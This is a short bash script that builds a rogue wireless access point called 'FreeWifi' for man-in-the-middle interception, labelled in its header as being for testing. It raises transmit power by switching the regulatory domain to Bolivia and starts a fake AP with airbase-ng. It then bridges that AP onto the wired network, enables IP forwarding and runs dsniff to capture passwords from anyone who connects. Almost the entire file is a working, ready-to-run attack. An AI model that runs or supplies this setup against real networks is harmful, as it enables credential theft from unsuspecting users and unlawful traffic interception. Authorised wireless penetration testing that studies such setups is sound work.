#!/bin/bash
#
# Set up a rogue wireless AP for MitM testing

# Set the WLAN interface
wlan=wlan2
eth=eth0


# Set regulatory domain to Bolivia and TX power to 30dBi.
# This section is optional and is intended for high power Alfa cards.
iw reg get
iw reg set BO
iwconfig wlan2 txpower 30
iw dev wlan2 set txpower fixed 3000
sleep 3
iwconfig wlan2

# Set wlan in monitor mode on channel and start airbase-ng
airmon-ng check kill
airmon-ng start wlan2 6
airbase-ng -c 6 -e "FreeWifi" mon0 &
echo "[*] Sleeping for 5 seconds"
sleep 5

# Install bridge-utils and set up a bridge called hacker, adding in eth0 and at0 created by airbase-ng.
#apt-get install bridge-utils
brctl addbr mitm
brctl addif mitm eth0
brctl addif mitm at0

# Assign eth0 and at0 interfaces IPs of 0.0.0.0 and the bridge interface a valid IP address for the wired network.
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
dhclient mitm
ifconfig mitm

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Define default route for traffic originating from this host
#ip route add default via 192.168.1.1

# Enable name resolution
#echo "nameserver 192.168.1.1" >> /etc/resolv.conf

# Run dsniff to sniff passwords
dsniff at0 &
